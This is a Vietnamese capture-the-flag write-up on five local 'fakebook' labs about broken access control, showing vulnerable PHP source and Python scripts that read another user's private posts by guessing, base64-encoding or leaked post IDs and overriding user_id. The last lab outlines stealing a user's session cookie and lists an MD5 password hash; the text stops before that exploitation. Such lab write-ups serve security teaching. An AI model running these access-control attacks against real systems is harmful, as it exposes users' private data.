# Cyber Jutsu (Access Control Vulnerabilities)

mình dùng docker để build những bài lap này

![image](https://hackmd.io/_uploads/Sys1epMF6.png)

![image](https://hackmd.io/_uploads/SkZGtaMYT.png)

# nhiệm vụ của chúng ta qua các bài lab là đọc status của crush :>>

## fakebook-web-1

![image](https://hackmd.io/_uploads/H1OFKaGYa.png)

### - Phân tích:

source post.php:

```php
<?php
include('libs/auth.php');
include('libs/db.php');

header('Content-Type: application/json');

$user_id = $_SESSION['user_id'];

if (!isset($_GET['action']))
    die(json_encode("Error"));

switch ($_GET['action']) {
    case 'list_posts':
        $res = select_all(
            'SELECT post_id, public FROM posts WHERE author_id = ?',
            $user_id
        );
        echo json_encode($res);
        break;
    case 'read':
        $post = select_one(
            'SELECT content, public, author_id FROM posts WHERE post_id = ?',
            $_GET['id']
        );
        if ($post)
            echo json_encode($post);
        else
            echo json_encode("Not Found");
        break;
    case 'create':
        $res = exec_query(
            'INSERT INTO posts (content, public, author_id) VALUES (?, ?, ?);',
            $_POST['content'],
            $_POST['public'],
            $user_id
        );
        header('Refresh:2; url=wall.php'); // Redirect về wall.php sau 2s
        echo json_encode('Post created');
        break;
}
```

chương trình cho chúng ta tạo tài khoản và đăng nhập rồi đăng bài lên đó

**chúng ta có thể thấy:**

<ul>
    <li>trong case <b>list_posts</b> ứng dụng sẽ truy vấn post_id, public thông qua <b>$user_id</b> mà biến này chúng ta có thể kiểm soát thông qua <b>session</b> -> <b>untrusted data</b>
    </li>
    <li>trong case <b>read</b> ứng dụng sẽ truy vấn content, public, author_id thông qua <b>$_GET['id']</b> mà biến này chúng ta có thể kiểm soát -> <b>untrusted data</b>
    </li>
</ul>
những case này không có cơ chế kiểm soát dữ liệu mà chúng ta gửi vào

mình đăng ký và đăng nhập vào fakebook rồi mình đăng bài viết

![image](https://hackmd.io/_uploads/Hy26c6GKa.png)

![image](https://hackmd.io/_uploads/H1EAp6zFa.png)

và lần lượt nó sẽ gọi đến list_post và read để hiện ra các bài post của mình

![image](https://hackmd.io/_uploads/rJJx26fKT.png)

### - Khai thác:

crush của mình chơi fakebook chước mình nên **id** sẽ ít hơn 5 và mình sẽ thử thay đổi trường id này

![image](https://hackmd.io/_uploads/HyMmapzta.png)

mình nhập id là 3 và có được flag: **CBJS{FAKE_FLAG_FAKE_FLAG}**

mình viết lại script khai thác:

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'http://127.0.0.1:24001'

session = requests.Session()
# đăng ký tài khoản
data = {
    'username': 'cuong',
    'password': 123
}

response = session.post(
    url + '/index.php?action=register',
    data=data,
    verify=False,
)

print(response.text) # verify

# đăng nhập tài khoản
response = session.post(
    url + '/index.php?action=login',
    data=data,
    verify=False
)

print(response.text) # verify

# đăng bài viết ở dạng riêng tư -> public = 0
data_content = {
    'content': 'cuong',
    'public': 0
}

response = session.post(
    url + '/post.php?action=create',
    data=data_content,
    verify=False,
)

print(response.text) # verify

# hiển thị bài đăng có id là 000003 của crush
response = session.get(
    url + '/post.php?action=read&id=3',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/BJ7iytXFp.png)

![image](https://hackmd.io/_uploads/HJJ3kFmKp.png)

và có được flag: **CBJS{FAKE_FLAG_FAKE_FLAG}**

## fakebook-web-2

![image](https://hackmd.io/_uploads/S1jztPmFT.png)

### - Phân tích:

source post.php:

```php
<?php
include('libs/auth.php');
include('libs/db.php');

header('Content-Type: application/json');

$user_id = $_SESSION['user_id'];

if (!isset($_GET['action']))
    die(json_encode("Error"));

switch ($_GET['action']) {
    case 'list_posts':
        $res = select_all(
            'SELECT post_id, public FROM posts WHERE author_id = ?',
            $user_id
        );
        echo json_encode($res);
        break;
    case 'read':
        $post = select_one(
            'SELECT content, public, author_id FROM posts WHERE post_id = ?',
            $_GET['id']
        );
        if ($post)
            echo json_encode($post);
        else
            echo json_encode("Not Found");
        break;
    case 'create':
        $res = exec_query(
            'INSERT INTO posts (post_id, content, public, author_id) VALUES (?, ?, ?, ?);',
            generate_id(),
            $_POST['content'],
            $_POST['public'],
            $user_id
        );
        header('Refresh:2; url=wall.php'); // Redirect về wall.php sau 2s
        echo json_encode('Post created');
        break;
}
```

![image](https://hackmd.io/_uploads/H16RYvQY6.png)

file post của bài này chỉ khác với bài trước ở chức năng tạo tài khoản và có 4 tham số thay vì 3 của bài 1 đó là **generate_id()**

tức là id lúc này không còn tuyến tính là các số theo thứ tự bài post mà là một mã do hàm **generate_id()** sinh ra

![image](https://hackmd.io/_uploads/ByOqhD7FT.png)

hàm sẽ nhận số bài post theo dạng đủ 6 chữ số và nếu không đủ 6 chữ số thì thêm số 0 vào đằng trước và encode base64

mình đăng ký và đăng nhập vào fakebook rồi mình đăng bài viết

![image](https://hackmd.io/_uploads/ByF5pDQtp.png)

![image](https://hackmd.io/_uploads/B160TvQtp.png)

id của chúng ta bị encode thành **"MDAwMDA0"**

![image](https://hackmd.io/_uploads/Hkim0DXFa.png)

chuyển sang repeater và burp suite tự decode cho chúng ta là **000004**

### - Khai thác:

chúng ta đã biết bài đăng của crush có id là 3 ở bài 1 nên mình thử encode id là 3 này rồi gửi gói tin

![image](https://hackmd.io/_uploads/HJtTCDXYp.png)

![image](https://hackmd.io/_uploads/HJ0AAv7tp.png)

mình viết lại script khai thác:

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'http://127.0.0.1:24002'

session = requests.Session()
# đăng ký tài khoản
data = {
    'username': 'cuong',
    'password': 123
}

response = session.post(
    url + '/index.php?action=register',
    data=data,
    verify=False,
)

print(response.text) # verify

# đăng nhập tài khoản
response = session.post(
    url + '/index.php?action=login',
    data=data,
    verify=False
)

print(response.text) # verify

# đăng bài viết ở dạng riêng tư -> public = 0
data_content = {
    'content': 'cuong',
    'public': 0
}

response = session.post(
    url + '/post.php?action=create',
    data=data_content,
    verify=False,
)

print(response.text) # verify

# hiển thị bài đăng có id là 000003 của crush
response = session.get(
    url + '/post.php?action=read&id=MDAwMDAz',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/rkeoCOXYa.png)

![image](https://hackmd.io/_uploads/ByInCdQK6.png)

và có được flag: **CBJS{FAKE_FLAG_FAKE_FLAG}**

## fakebook-web-3

![image](https://hackmd.io/_uploads/rJJN-FQF6.png)

### - Phân tích:

source post.php:

```php
<?php
include('libs/auth.php');
include('libs/db.php');

header('Content-Type: application/json');

$user_id = $_SESSION['user_id'];
if (isset($_GET['user_id']))
    $user_id = $_GET['user_id'];

if (!isset($_GET['action']))
    die(json_encode("Error"));

switch ($_GET['action']) {
    case 'list_posts':
        $res = select_all(
            'SELECT post_id, public FROM posts WHERE author_id = ?',
            $user_id
        );
        echo json_encode($res);
        break;
    case 'read':
        $post = select_one(
            'SELECT content, public, author_id FROM posts WHERE post_id = ?',
            $_GET['id']
        );
        if ($post)
            echo json_encode($post);
        else
            echo json_encode("Not Found");
        break;
    case 'create':
        $res = exec_query(
            'INSERT INTO posts (post_id, content, public, author_id) VALUES (?, ?, ?, ?);',
            generate_id(),
            $_POST['content'],
            $_POST['public'],
            $user_id
        );
        header('Refresh:2; url=wall.php'); // Redirect về wall.php sau 2s
        echo json_encode('Post created');
        break;
}
```

![image](https://hackmd.io/_uploads/Sk1TZKmKp.png)

file post của bài này chỉ khác với bài trước ở chức năng kiểm soát user_id của người dùng trước khi list toàn bộ các bài post ra

id lúc này không còn tuyến tính là các số theo thứ tự bài post mà là một mã do hàm **generate_id()** sinh ra

![image](https://hackmd.io/_uploads/rJSTmFXtp.png)

hàm sẽ tạo ngẫu nhiên id của bài post bằng **random_bytes(16)** và chuyển sang hệ 16

bin2hex() với kết quả của random_bytes(16), bài đang chuyển đổi chuỗi nhị phân thành một chuỗi hexadecimals. Hàm bin2hex() này chuyển đổi mỗi byte của chuỗi vào hai ký tự hex (hệ cơ số 16), tạo ra một chuỗi hex có độ dài gấp đôi so với chuỗi ban đầu.

mình đăng ký và đăng nhập vào fakebook rồi mình đăng bài viết

![image](https://hackmd.io/_uploads/BJC1mYmF6.png)

![image](https://hackmd.io/_uploads/SJ848Y7ta.png)

![image](https://hackmd.io/_uploads/rJNSLFXFa.png)

khi mình nhấn vào crush có **user_id = 2** thì không xem được bài đăng nhưng vẫn hiện ra **post_id** bài đăng của crush trên burp suite là **"38405b03f1c29368beaaa94f24a1c893"** dù không có quyền đọc

![image](https://hackmd.io/_uploads/HJ4rT3XKp.png)

### - Khai thác:

mình sang repeater rồi sửa trường của mình id thành post_id của crush và đọc được flag

![image](https://hackmd.io/_uploads/HJMoa3mKp.png)

và mình có được flag: **CBJS{FAKE_FLAG_FAKE_FLAG}**

mình viết lại script khai thác:

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'http://127.0.0.1:24003'

session = requests.Session()
# đăng ký tài khoản
data = {
    'username': 'cuong',
    'password': 123
}

response = session.post(
    url + '/index.php?action=register',
    data=data,
    verify=False,
)

print(response.text) # verify

# đăng nhập tài khoản
response = session.post(
    url + '/index.php?action=login',
    data=data,
    verify=False
)

print(response.text) # verify

# đăng bài viết ở dạng riêng tư -> public = 0
data_content = {
    'content': 'cuong',
    'public': 0
}

response = session.post(
    url + '/post.php?action=create',
    data=data_content,
    verify=False,
)

print(response.text) # verify

# hiển thị bài đăng có id  của crush
response = session.get(
    url + '/post.php?action=read&id=38405b03f1c29368beaaa94f24a1c893',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/ryUFJTQKa.png)

![image](https://hackmd.io/_uploads/BkZ5kTmt6.png)

và mình có được flag: **CBJS{FAKE_FLAG_FAKE_FLAG}**

## fakebook-web-4

![image](https://hackmd.io/_uploads/r1EZeaXtp.png)

### - Phân tích:

source post.php:

```php
<?php
include('libs/auth.php');
include('libs/db.php');

header('Content-Type: application/json');

$user_id = $_SESSION['user_id'];
if (isset($_GET['user_id']))
    $user_id = $_GET['user_id'];

if (!isset($_GET['action']))
    die(json_encode("Error"));

switch ($_GET['action']) {
    case 'list_posts':
        $res = select_all(
            'SELECT post_id, public FROM posts WHERE author_id = ?',
            $user_id
        );
        echo json_encode($res);
        break;
    case 'read':
        $post = select_one(
            'SELECT content, public, author_id FROM posts
            WHERE post_id = ? AND (public = 1 OR author_id = ?)',
            $_GET['id'],
            $user_id
        );
        if ($post)
            echo json_encode($post);
        else
            echo json_encode("Not Found");
        break;
    case 'create':
        $res = exec_query(
            'INSERT INTO posts (post_id, content, public, author_id) VALUES (?, ?, ?, ?);',
            generate_id(),
            $_POST['content'],
            $_POST['public'],
            $user_id
        );
        header('Refresh:2; url=wall.php'); // Redirect về wall.php sau 2s
        echo json_encode('Post created');
        break;
}
```

![image](https://hackmd.io/_uploads/ryAPgT7Kp.png)

file post của bài này chỉ khác với bài trước ở chức năng **read** của người dùng khi có thêm public = 1 tức là ở chế độ công khai hoặc author_id bằng với id mà chúng ta nhập vào nên ở bài này chỉ có chủ sở hữu bài đăng mới xem được bài private của mình

id không còn tuyến tính là các số theo thứ tự bài post mà là một mã do hàm **generate_id()** sinh ra

![image](https://hackmd.io/_uploads/rJSTmFXtp.png)

hàm sẽ tạo ngẫu nhiên id của bài post bằng **random_bytes(16)** và chuyển sang hệ 16

mình đăng ký và đăng nhập vào fakebook rồi mình đăng bài viết

khi mình nhấn vào crush có **user_id = 2** thì không xem được bài đăng nhưng vẫn hiện ra **post_id** bài đăng của crush trên burp suite là **"a7381cbd118b5699a69c576c7a2205ef"** dù không có quyền đọc

![image](https://hackmd.io/_uploads/r1RqGp7Fa.png)

### - Khai thác:

mình sang repeater rồi sửa trường của mình id thành post_id của crush như bài trước nhưng không được flag như chúng ta phân tích

![image](https://hackmd.io/_uploads/SJhtmpXta.png)

nhưng bài không có cơ chế kiểm soát khi mình đổi lại **user_id=2** mà không để chương trình lấy user_id lấy từ session và có được flag

![image](https://hackmd.io/_uploads/SkTFNa7Fp.png)

![image](https://hackmd.io/_uploads/Ska0mTXKa.png)

mình viết lại script khai thác:

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'http://127.0.0.1:24004'

session = requests.Session()
# đăng ký tài khoản
data = {
    'username': 'cuong',
    'password': 123
}

response = session.post(
    url + '/index.php?action=register',
    data=data,
    verify=False,
)

print(response.text) # verify

# đăng nhập tài khoản
response = session.post(
    url + '/index.php?action=login',
    data=data,
    verify=False
)

print(response.text) # verify

# đăng bài viết ở dạng riêng tư -> public = 0
data_content = {
    'content': 'cuong',
    'public': 0
}

response = session.post(
    url + '/post.php?action=create',
    data=data_content,
    verify=False,
)

print(response.text) # verify

# hiển thị bài đăng có id  của crush
response = session.get(
    url + '/post.php?action=read&id=a7381cbd118b5699a69c576c7a2205ef&user_id=2',
    verify=False,
)

print(response.text) # hiển thị response có flag
```

![image](https://hackmd.io/_uploads/rkOtSpQF6.png)

![image](https://hackmd.io/_uploads/H1X5BTmFa.png)

và mình được flag: **CBJS{FAKE_FLAG_FAKE_FLAG}**

## fakebook-web-5

![image](https://hackmd.io/_uploads/rkCivTXK6.png)

### - Phân tích:

source post.php:

```php
<?php
include('libs/auth.php');
include('libs/db.php');

header('Content-Type: application/json');

$user_id = $_SESSION['user_id'];
if (isset($_GET['user_id']))
    $user_id = $_GET['user_id'];

if (!isset($_GET['action']))
    die(json_encode("Error"));

switch ($_GET['action']) {
    case 'list_notifications':
        $res = select_all(
            'SELECT content FROM notifications ORDER BY noti_id DESC LIMIT 5'
        );
        echo json_encode($res);
        break;
    case 'list_posts':
        $res = select_all(
            'SELECT post_id, public FROM posts WHERE author_id = ?',
            $user_id
        );
        echo json_encode($res);
        break;
    case 'read':
        $post = select_one(
            'SELECT content, public, author_id FROM posts
            WHERE post_id = ? AND (public = 1 OR author_id = ?)',
            $_GET['id'],
            $_SESSION['user_id']
        );
        if ($post)
            echo json_encode($post);
        else
            echo json_encode("Not Found");
        break;
    case 'create':
        $res = exec_query(
            'INSERT INTO posts (post_id, content, public, author_id) VALUES (?, ?, ?, ?);',
            generate_id(),
            $_POST['content'],
            $_POST['public'],
            $_SESSION['user_id']
        );
        header('Refresh:2; url=wall.php'); // Redirect về wall.php sau 2s
        echo json_encode('Post created');
        break;
}
```

![image](https://hackmd.io/_uploads/BJR4u6XtT.png)
bài này thêm chức năng **list_notifications** so với bài trước và chỉnh sửa chức năng read và create

![image](https://hackmd.io/_uploads/rJAK_a7Kp.png)

bài không cho chúng ta lấy thông tin **user_id** từ $\_GET[] mà truyền từ $\_SESSION['user_id'] được lưu trên browser

mình đăng ký và đăng nhập vào fakebook rồi mình đăng bài viết

![image](https://hackmd.io/_uploads/BysYw6mFa.png)

![image](https://hackmd.io/_uploads/BJqtqpmFa.png)

khi mình nhấn vào crush có **user_id = 2** thì không xem được bài đăng nhưng vẫn hiện ra **post_id** bài đăng của crush trên burp suite là **"a7381cbd118b5699a69c576c7a2205ef"** dù không có quyền đọc

![image](https://hackmd.io/_uploads/BJsn5aXKT.png)

chúng ta cần có được session của crush để lấy được flag

![image](https://hackmd.io/_uploads/ryelkCQFa.png)

chúng ta cần up rce và đợi crush đăng nhập vào tải khoản của mình rồi lấy session và sau đó thay đổi ở cả trường id và Cookie: PHPSESSID của chúng ta

đăng nhập tài khoản

![image](https://hackmd.io/_uploads/Hk3hxCXt6.png)

tạo tài khoản

![image](https://hackmd.io/_uploads/r1wilCmK6.png)

để làm bài lab mình sẽ vừa đóng vai là crush đăng nhập vào và vừa đóng vai là hacker

**tài khoản của crush:** được lưu trong database local
username: crush
password: 76a326f56268f367b513822a276785bd (được hash md5)

### - Khai thác:
